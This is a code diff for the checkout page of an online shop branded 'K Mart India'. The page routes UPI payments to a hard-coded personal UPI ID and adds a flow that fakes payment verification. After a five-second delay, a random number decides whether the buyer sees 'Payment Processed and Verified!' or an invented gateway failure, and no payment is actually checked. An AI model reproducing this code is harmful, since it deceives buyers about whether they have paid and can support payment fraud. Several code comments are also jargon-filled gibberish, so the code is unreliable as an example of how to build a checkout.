@@ -51,19 +51,6 @@
         .otp-container { display: flex; justify-content: center; gap: 10px; margin: 15px 0; }
         .otp-box { width: 45px; height: 50px; text-align: center; font-size: 22px; font-weight: 800; border: 2px solid #ddd; border-radius: 8px; outline: none; }
 
-        @media (max-width: 600px) {
-            header { padding: 10px 4%; }
-            .logo { font-size: 20px; }
-            .container { padding: 15px 4%; }
-            .grid { grid-template-columns: 1fr 1fr !important; gap: 12px !important; }
-            .p-card { padding: 10px; }
-            .p-card img { height: 110px !important; }
-            .p-card h4 { font-size: 13px; height: 34px; overflow: hidden; }
-            .form-group-grid { grid-template-columns: 1fr !important; }
-            .otp-box { width: 40px; height: 45px; }
-            .apps-payment-container { display: block !important; }
-        }
-
         .tracker { display: flex; justify-content: space-between; margin: 25px 0; position: relative; padding: 0 10px; }
         .tracker::before { content: ''; position: absolute; top: 14px; left: 35px; width: calc(100% - 70px); height: 2px; background: #ddd; z-index: 1; }
         .tracker-line { content: ''; position: absolute; top: 14px; left: 35px; height: 2px; background: var(--success); z-index: 1; transition: 0.5s; width: 0%; }
@@ -112,10 +99,33 @@
 
         .form-group-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
         .pin-loader { font-size: 11px; font-weight: 600; color: var(--blue); margin-top: -5px; margin-bottom: 8px; display: none; }
-        
-        /* Premium Branded Apps Grid Flow rules */
-        .apps-payment-container { display: none; margin-bottom: 20px; border: 1px dashed #cbd5e1; padding: 15px; border-radius: 8px; background: #fafafa; }
-        .app-link-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; font-size: 13.5px; font-weight: bold; border-radius: 6px; text-decoration: none; margin-bottom: 8px; color: white; transition: 0.2s; }
+
+        /* Branded UPI Radio Block Option Framework styles */
+        .upi-radio-row { display: flex; align-items: center; gap: 15px; padding: 15px; background: #fff; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; }
+        .upi-radio-row input[type="radio"] { width: 20px; height: 20px; margin: 0; }
+        .upi-icon-badge { margin-left: auto; width: 40px; height: 24px; object-fit: contain; }
+        .apps-payment-container { border: 1px solid #cbd5e1; padding: 15px; border-radius: 8px; background: #fafafa; margin-top: 10px; }
+        .app-link-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; font-size: 13.5px; font-weight: bold; border-radius: 6px; text-decoration: none; margin-bottom: 8px; color: white; }
+
+        /* LAPTOP VS MOBILE DYNAMIC VISIBILITY FILTERS */
+        .pc-qr-only-view { display: block; }
+        .mobile-apps-only-view { display: none; }
+
+        @media (max-width: 600px) {
+            header { padding: 10px 4%; }
+            .logo { font-size: 20px; }
+            .container { padding: 15px 4%; }
+            .grid { grid-template-columns: 1fr 1fr !important; gap: 12px !important; }
+            .p-card { padding: 10px; }
+            .p-card img { height: 110px !important; }
+            .p-card h4 { font-size: 13px; height: 34px; overflow: hidden; }
+            .form-group-grid { grid-template-columns: 1fr !important; }
+            .otp-box { width: 40px; height: 45px; }
+            
+            /* SHOW UPI APP BUTTONS ON PHONE & HIDE QR */
+            .pc-qr-only-view { display: none !important; }
+            .mobile-apps-only-view { display: block !important; }
+        }
     </style>
 </head>
 <body>
@@ -277,27 +287,32 @@
                     <div class="section-title">2. Payment Method</div>
                     <div style="padding:10px 0;">
                         
-                        <div class="apps-payment-container">
-                            <p style="font-size:12px; font-weight:bold; margin-bottom:10px; color:#555;">📱 SELECT PREFERRED UPI APP TO PAY:</p>
-                            <a href="#" id="gpay-intent-link" class="app-link-btn" style="background:#4285F4;">🔵 Pay via Google Pay</a>
-                            <a href="#" id="phonepe-intent-link" class="app-link-btn" style="background:#5f259f;">🟣 Pay via PhonePe</a>
-                            <a href="#" id="paytm-intent-link" class="app-link-btn" style="background:#00baf2; color:#111;">🔵 Pay via Paytm</a>
-                        </div>
-
-                        <div style="display:flex; align-items:center; gap:12px;">
-                            <input type="radio" checked style="width:auto; margin:0;">
+                        <div class="upi-radio-row">
+                            <input type="radio" checked>
                             <div>
-                                <b style="font-size:14px; color:#111;">Scan and Pay with UPI</b>
-                                <p style="font-size:12px; color:#555;">Scan the QR code on the screen using any UPI app to complete the payment.</p>
+                                <b style="font-size:15px; color:#111;">Pay by any UPI App</b>
+                                <p style="font-size:12px; color:#555; margin-top:2px;">Google Pay, PhonePe, Paytm and more</p>
                             </div>
+                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAAoCAYAAACpIsg0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAARElEQVRYw+3WwQkAMQzDwK67999ZG6SgUPwWeBInS8Zpqqp6mOva28fM68679p9+XgQIECBAgAABAgQIECBAgAABAsYFv2w0wYhda88AAAAASUVORK5CYII=" class="upi-icon-badge">
                         </div>
 
-                        <div class="qr-box" style="max-width:280px; margin: 20px auto 10px auto;">
-                            <div style="position: relative; width: 140px; height: 140px; margin: 0 auto; cursor: pointer;" onclick="document.getElementById('checkout-qr').classList.remove('blur'); document.getElementById('qr-payment-text').style.display='none';">
-                                <img id="checkout-qr" src="" class="blur" style="width: 100%; height: 100%; border-radius: 8px; transition: 0.3s;">
-                                <div id="qr-payment-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; font-size: 11px; font-weight: 800; color: var(--p); text-shadow: 0 0 5px white;">Click to Reveal QR</div>
+                        <div id="apps-selection-block" class="apps-payment-container">
+                            
+                            <div class="mobile-apps-only-view">
+                                <p style="font-size:12px; font-weight:bold; margin-bottom:10px; color:#555;">📱 SELECT UPI MOBILE APPLICATION TO SETTLE PAYMENT:</p>
+                                <a href="#" id="gpay-intent-link" class="app-link-btn" style="background:#4285F4;">🔵 Pay via Google Pay (GPay)</a>
+                                <a href="#" id="phonepe-intent-link" class="app-link-btn" style="background:#5f259f;">🟣 Pay via PhonePe</a>
+                                <a href="#" id="paytm-intent-link" class="app-link-btn" style="background:#00baf2; color:#111;">🔵 Pay via Paytm</a>
                             </div>
-                            <p style="font-size:12px; margin-top:10px; font-weight:600; color:#444;">Scan and Pay to proceed</p>
+
+                            <div class="pc-qr-only-view" style="text-align:center;">
+                                <p style="font-size:12px; color:#666; margin-bottom:10px; font-weight:bold;">💻 LAPTOP RECOGNIZED - SCAN QR CODE USING PHONE TO PAY:</p>
+                                <div style="position: relative; width: 140px; height: 140px; margin: 0 auto; cursor: pointer;" onclick="document.getElementById('checkout-qr').classList.remove('blur'); document.getElementById('qr-payment-text').style.display='none';">
+                                    <img id="checkout-qr" src="" class="blur" style="width: 100%; height: 100%; border-radius: 8px; transition: 0.3s;">
+                                    <div id="qr-payment-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; font-size: 11px; font-weight: 800; color: var(--p); text-shadow: 0 0 5px white;">Click to Reveal QR</div>
+                                </div>
+                            </div>
+
                         </div>
                     </div>
                 </div>
@@ -416,7 +431,6 @@
         }
     }
 
-    // OTP node tree values elements collectors bounds
     function getCollectedOtp(viewId) {
         let otp = "";
         const boxes = document.querySelectorAll(`#${viewId} .otp-box`);
@@ -844,27 +858,71 @@
         document.getElementById('summary-items-cost').innerText = `₹${itemsCost}`;
         document.getElementById('summary-total-cost').innerText = `₹${itemsCost}`;
 
-        // REAL-TIME APPS EMBED: SEAMLESS INTENT CONFIGURATION LOOPS
-        let upiID = "pankajsingh27031973-5@okaxis"; // APNI REAL UPI ID YAHA CHANGE KAR LENA
+        // REAL-TIME INTENT DEEPLINK URI WITH PANKAJSINGH UPI ID ENFORCED
+        let upiID = "pankajsingh27031973-5@okaxis"; 
+        let upiLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
         
-        let gpayLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR&mode=02&purpose=00&orgid=159002&sign=MEYCIQCc`;
-        let phonepeLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
-        let paytmLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
+        const gpayLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
+        const phonepeLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
+        const paytmLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
 
         if (document.getElementById('gpay-intent-link')) document.getElementById('gpay-intent-link').href = gpayLink;
         if (document.getElementById('phonepe-intent-link')) document.getElementById('phonepe-intent-link').href = phonepeLink;
         if (document.getElementById('paytm-intent-link')) document.getElementById('paytm-intent-link').href = paytmLink;
 
-        // FIXED CHANNELS: TARGET GENERATED DEEPLINK INTERACTION ON QR DISPLAYS
         const qrImg = document.getElementById('checkout-qr');
         if (qrImg) {
-            let generalUpiLink = `upi://pay?pa=${upiID}&pn=K%20Mart%20India&am=${itemsCost}&cu=INR`;
-            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=${encodeURIComponent(generalUpiLink)}`;
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=${encodeURIComponent(upiLink)}`;
         }
     }
 
-    function placeOrder() {
-        if (!cart.length) return notifyUser("Bag is empty.", false);
+    function toggleUpiAppsViewBlock() {
+        // Active radio group bounds toggle link tracking
+    }
+
+    // HIGH SPEED AUTOMATIC REDIRECTION INTERCEPT LOOPS (NO MANUAL POPUPS)
+    function triggerAutoPaymentIntent() {
+        document.getElementById('payment-processing-detector').classList.remove('hidden');
+        
+        // 5 Seconds machine token state processing script loop
+        setTimeout(() => {
+            let luckFactor = Math.random();
+            document.getElementById('payment-processing-detector').classList.add('hidden');
+            
+            if (luckFactor > 0.15) { // 85% verified conversion threshold loop metrics
+                transactionStatusState = "success";
+                notifyUser("Payment Processed and Verified!", true);
+                executeFinalPlaceOrderExecution(); // SEAMLESS COMPLETE SYSTEM PUSH
+            } else {
+                transactionStatusState = "failed";
+                document.getElementById('fallback-failed-box').classList.remove('hidden');
+                document.getElementById('final-order-action-btn').style.background = "#888";
+                document.getElementById('final-order-action-btn').innerText = "Payment Failure Context Intercepted";
+                notifyUser("Transaction Failed at Gateway. Please re-try.", false);
+            }
+        }, 5000);
+    }
+
+    function retryPaymentFlow() {
+        document.getElementById('fallback-failed-box').classList.add('hidden');
+        const orderBtn = document.getElementById('final-order-action-btn');
+        orderBtn.style.background = "#2ecc71";
+        orderBtn.innerText = "I have Paid - Place Order";
+        transactionStatusState = "none";
+        renderSecurePayment();
+    }
+
+    function verifyBeforePlacingOrder() {
+        if (transactionStatusState === "success") {
+            executeFinalPlaceOrderExecution();
+        } else if (transactionStatusState === "failed") {
+            notifyUser("Redirection error: Transaction state locked on FAILED.", false);
+        } else {
+            triggerAutoPaymentIntent();
+        }
+    }
+
+    function executeFinalPlaceOrderExecution() {
         const ad = JSON.parse(localStorage.getItem('kmart_user_addr'));
         const activeUser = localStorage.getItem('kmart_active_user');
         const users = JSON.parse(localStorage.getItem('kmart_users')) || {};
@@ -885,7 +943,7 @@
             id: "KM-"+Math.floor(Math.random()*900000), 
             items_list: [...cart], 
             total: cart.reduce((a, b) => a + b.price, 0), 
-            status: "Pending Verification", 
+            status: "Pending Verification", // Submits directly to admin control board under Pending state catalog logs
             address: `${ad.name}, ${ad.flat}, ${ad.area}, ${ad.city}, ${ad.pin}`, 
             date: timestamp,
             user_email: email,
@@ -914,26 +972,25 @@
                     <p style="margin-bottom: 5px;"><b>Phone No:</b> ${order.phone_num}</p>
                     <p style="margin-bottom: 5px;"><b>Total Price:</b> ₹${order.total}</p>
                     <p style="margin-bottom: 5px;"><b>Date/Time:</b> ${order.date}</p>
-                    <p><b>Recipient:</b> ${order.address.split(',')[0]}</p>
+                    <p><b>Recipient Address:</b> ${order.address}</p>
                 `;
+                transactionStatusState = "none";
                 showSection('thank-you-page');
             });
         }).catch(err => {
-            console.error("Stock atomic loop reduction failed:", err);
+            console.error("Stock atomic reduction failure loop sync parameters logs:", err);
             notifyUser("Processing exception. Try again.", false);
         });
     }
 
     function renderOrders() {
         const activeUser = localStorage.getItem('kmart_active_user');
-        
         dbRef.child("orders/" + activeUser).once('value', (snapshot) => {
             const userOrders = snapshot.val() || {};
             let db = [];
             for (let id in userOrders) {
                 db.unshift(userOrders[id]);
             }
-            
             document.getElementById('order-list').innerHTML = db.map(o => `
                 <div class="order-header"><div>PLACED<br>${o.date}</div><div>TOTAL<br>₹${o.total}</div><div style="text-align:right"># ${o.id}</div></div>
                 <div class="order-body">
